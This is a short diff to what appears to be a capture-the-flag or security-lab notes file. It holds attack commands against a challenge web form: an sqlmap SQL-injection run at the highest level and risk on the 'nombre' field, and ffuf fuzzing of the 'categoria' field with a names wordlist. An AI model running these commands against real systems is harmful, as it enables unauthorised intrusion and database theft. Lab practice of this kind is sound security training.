@@ -11,3 +11,8 @@ ffuf -u "$BASE/alta" -X POST -d "nombre=x&categoria=FUZZ" -H "Content-Type: appl
 
 BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
 sqlmap -u "$BASE/alta" --method=POST --data="nombre=test&categoria=Catering" -p nombre --batch --level=5 --risk=3 --threads=4 --dbms=sqlite --technique=BEUST
+
+
+BASE='https://chl-3080b01d-bb9c-4e54-bf7f-06f64c3e6d9a-cuentas-claras.b.softwareseguro.com.ar'
+# wordlist grande de español
+ffuf -u "$BASE/alta" -X POST -d "nombre=x&categoria=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -mc all -ac -t 20 2>/dev/null | head -20
